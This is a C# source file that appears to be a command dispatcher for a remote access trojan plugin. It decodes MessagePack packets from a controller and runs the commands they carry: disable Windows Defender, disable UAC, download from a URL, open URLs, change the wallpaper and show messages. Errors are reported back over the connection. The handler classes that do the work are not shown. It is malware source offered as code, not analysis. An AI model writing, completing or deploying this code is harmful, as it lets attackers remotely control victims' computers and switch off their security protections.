using System;
using System.Diagnostics;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Plugin.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "wallpaper":
                    {
                        new Wallpaper().Change(unpack_msgpack.ForcePathObject("Image").GetAsBytes(),
                            unpack_msgpack.ForcePathObject("Exe").AsString);
                        break;
                    }

                    case "visitURL":
                    {
                        var url = unpack_msgpack.ForcePathObject("URL").AsString;
                        if (!url.StartsWith("http")) url = "http://" + url;
                        Process.Start(url);
                        break;
                    }

                    case "sendMessage":
                    {
                        MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                        break;
                    }

                    case "disableDefedner":
                    {
                        new HandleDisableDefender().Run();
                        break;
                    }

                    case "disableUAC":
                    {
                        new HandleDisableUAC().Run();
                        break;
                    }

                    case "downloadFromUrl":
                    {
                        new HandleDownloadFromUrl().Start(unpack_msgpack.ForcePathObject("url").AsString);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }

            Connection.Disconnected();
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}